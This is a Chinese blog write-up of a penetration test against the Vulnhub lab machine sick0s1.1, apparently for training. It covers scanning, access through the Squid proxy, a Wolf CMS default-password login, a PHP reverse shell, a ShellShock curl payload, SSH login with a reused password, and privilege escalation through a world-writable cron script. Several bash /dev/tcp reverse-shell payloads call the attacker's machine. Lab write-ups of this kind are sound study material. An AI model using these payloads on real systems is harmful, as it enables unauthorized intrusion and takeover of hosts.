+++
date = '2026-10-25T10:51:43+08:00'
draft = true
title = '[Vulnhub靶机]sick0s1.1渗透记录'
tags = ['渗透','Vulnhub','wolfcms','弱口令','squid','ShellShock']
+++

## 信息收集

攻击机IP: 192.168.200.146
使用arp-scan获得靶机IP: 192.168.200.165

```shell
┌──(kali㉿kali)-[~/sick0s1.1]
└─$ sudo arp-scan -l
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.200.146
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       VMware, Inc.
192.168.200.2   00:50:56:fc:41:2a       VMware, Inc.
192.168.200.165 00:0c:29:6d:81:a0       VMware, Inc.
192.168.200.254 00:50:56:ec:d0:be       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.036 seconds (125.74 hosts/sec). 4 responded
```

端口探测

```shell
┌──(kali㉿kali)-[~/sick0s1.1]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.200.165                         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 10:55 +0800
Nmap scan report for 192.168.200.165
Host is up (0.00029s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
3128/tcp open   squid-http
8080/tcp closed http-proxy
MAC Address: 00:0C:29:6D:81:A0 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
```

深度扫描

```shell
┌──(kali㉿kali)-[~/sick0s1.1]
└─$ sudo nmap -sT -sV -sC -p22,3128,8080 192.168.200.165                       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 10:55 +0800
Nmap scan report for 192.168.200.165
Host is up (0.00038s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
MAC Address: 00:0C:29:6D:81:A0 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.86 seconds
```

发现3128端口开放着squid(一个代理服务器), 浏览器访问是错误页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE3128.avif)

爆破网站目录, 一无所获

```shell
┌──(kali㉿kali)-[~/sick0s1.1]
└─$ dirsearch -u http://192.168.200.165:3128/ -i 200,301,302
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/sick0s1.1/reports/http_192.168.200.165_3128/__26-10-25_11-22-52.txt

Target: http://192.168.200.165:3128/

[11:22:52] Starting: 
                                                                             
Task Completed
```

既然squid是代理服务器, 那么我们试试用它作为代理, 再访问80端口, 发现有返回

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%90%86.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E4%BB%A3%E7%90%86%E5%90%8E%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

对80端口进行目录爆破, 发现connect和robots.txt

```shell
┌──(kali㉿kali)-[~/sick0s1.1]
└─$ dirsearch -u http://192.168.200.165/ -i 200,301,302 --proxy http://192.168.200.165:3128/ 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/sick0s1.1/reports/http_192.168.200.165/__26-10-25_11-34-23.txt

Target: http://192.168.200.165/

[11:34:23] Starting: 
[11:34:33] 200 -  109B  - /connect                                          
[11:34:42] 200 -   58B  - /robots.txt
```

访问/connect, 是一段python代码, 功能是打印两句话

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E8%AE%BF%E9%97%AEconnect.avif)

访问/robots.txt, 发现/wolfcms

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/robots.avif)

访问/wolfcms, 是一个CMS系统

## 漏洞利用

### 方法1(后台弱口令)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/wolfcms.avif)

上网搜索这个CMS系统, 得知管理员页面在/?/admin, 访问发现登录框

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2.avif)

尝试使用默认用户名/密码: admin/admin 登录, 成功进入

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.avif)

在Files选项卡中我们可以在public目录中添加新的文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/Files%E9%80%89%E9%A1%B9%E5%8D%A1.avif)

访问public目录看一下

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E8%AE%BF%E9%97%AEpublic%E7%9B%AE%E5%BD%95.avif)

那么我们可以在public中写一个反弹shell的php脚本, 然后再去访问它, 这样我们就能拿到shell  
创建shell.php

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E5%88%9B%E5%BB%BAshell.php.avif)

写入反弹脚本并保存

```php
<?php system("bash -c 'bash -i >&/dev/tcp/192.168.200.146/4444 0>&1'");?>
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9%E8%84%9A%E6%9C%AC.avif)

攻击机用nc监听4444端口, 访问public/shell.php, 即可拿到shell

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E6%8B%BF%E5%88%B0shell.avif)

### 方法2(ShellShock)

看到网上writeup用nikto扫描会发现80端口存在ShellShock漏洞, 但我却扫不出来, 可能是nikto版本的原因吧  
访问http://192.168.200.165/cgi-bin/status, 可以发现服务器执行了uptime和uname -a

```shell
┌──(kali㉿kali)-[~/sick0s1.1]
└─$ curl http://192.168.200.165/cgi-bin/status --proxy http://192.168.200.165:3128/
{ "uptime": " 11:57:43 up 3:34, 0 users, load average: 0.00, 0.01, 0.05", "kernel": "Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux"}
```

ShellShock原理在[symfonos3靶机writeup](/posts/vulnhub靶机symfonos3渗透记录#漏洞利用)中写了, 这里就不讲了  
构建攻击payload

```shell
┌──(kali㉿kali)-[~/sick0s1.1]
└─$ curl http://192.168.200.165/cgi-bin/status --proxy http://192.168.200.165:3128/ -H 'Cookie: () { :;}; /bin/bash -i >&/dev/tcp/192.168.200.146/4444 0>&1;'
```

成功拿到shell

```shell
┌──(kali㉿kali)-[~/sick0s1.1]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.200.146] from (UNKNOWN) [192.168.200.165] 57294
bash: no job control in this shell
www-data@SickOs:/usr/lib/cgi-bin$
```

## 权限提升

### 方法1(获取sickos账户密码)

查看网站的config.php文件, 发现密码为john@123

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/sick0s1.1/%E5%8F%91%E7%8E%B0DB%E5%AF%86%E7%A0%81.avif)

因为/home中有sickos目录, 所以尝试使用用户名sickos, 密码john123登录ssh

```shell
www-data@SickOs:/var/www$ ls /home
ls /home
sickos
```

登录成功

```shell
┌──(kali㉿kali)-[~/sick0s1.1]
└─$ ssh sickos@192.168.200.165 
The authenticity of host '192.168.200.165 (192.168.200.165)' can't be established.
ECDSA key fingerprint is: SHA256:fBxcsD9oGyzCgdxtn34OtTEDXIW4E9/RlkxombNm0y8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.200.165' (ECDSA) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
sickos@192.168.200.165's password: 
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Oct 25 10:40:17 IST 2026

  System load:  0.0               Processes:           119
  Usage of /:   4.3% of 28.42GB   Users logged in:     0
  Memory usage: 18%               IP address for eth0: 192.168.200.165
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

124 packages can be updated.
92 updates are security updates.

New release '14.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Sep 22 08:32:44 2015
```

sudo -l, 发现能执行任何命令

```shell
sickos@SickOs:~$ sudo -l
[sudo] password for sickos: 
Matching Defaults entries for sickos on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sickos may run the following commands on this host:
    (ALL : ALL) ALL
```

提权并读取flag

```shell
sickos@SickOs:~$ sudo /bin/bash
root@SickOs:~# pwd
/home/sickos
root@SickOs:~# cd /root
root@SickOs:/root# ls
a0216ea4d51874464078c618298b1367.txt
root@SickOs:/root# cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

### 方法2(定时任务)

在之前的网站目录爆破中我们发现了一个python脚本, 根据其中的内容可推断它会定期运行  
查看crontab

```shell
www-data@SickOs:/var/www$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

里面没有有用的信息, 查看/etc/cron.d目录内容

```shell
www-data@SickOs:/etc/cron.d$ ls -la
ls -la
total 20
drwxr-xr-x  2 root root 4096 Dec  5  2015 .
drwxr-xr-x 90 root root 4096 Oct 25  2026 ..
-rw-r--r--  1 root root  102 Jun 20  2012 .placeholder
-rw-r--r--  1 root root   52 Dec  5  2015 automate
-rw-r--r--  1 root root  544 Jul  2  2015 php5
```

在automate中, 存在这个python脚本, 每隔1分钟执行一次

```shell
www-data@SickOs:/etc/cron.d$ cat automate
cat automate

* * * * * root /usr/bin/python /var/www/connect.py
```

查看connect.py, 发现可写

```shell
www-data@SickOs:/var/www$ ls -l
ls -l
total 16
-rwxrwxrwx 1 root root  109 Dec  5  2015 connect.py
-rw-r--r-- 1 root root   21 Dec  5  2015 index.php
-rw-r--r-- 1 root root   45 Dec  5  2015 robots.txt
drwxr-xr-x 5 root root 4096 Dec  5  2015 wolfcms
```

攻击机在5555端口开启监听, 在connect中追加反弹shell代码, 注意python默认使用sh, 而sh不支持重定向, 会出现Syntax error: Bad fd number错误, 所以需要使用bash -c强制后面的命令由bash解析

```shell
www-data@SickOs:/var/www$ echo "import os;os.system('bash -c \'/bin/bash -i >&/dev/tcp/192.168.200.146/5555 0>&1\'')" >> connect.py
```

等待一会即可获得反弹shell

```shell
┌──(kali㉿kali)-[~/sick0s1.1]
└─$ rlwrap nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.200.146] from (UNKNOWN) [192.168.200.165] 42976
bash: no job control in this shell
root@SickOs:~# whoami
whoami
root
```
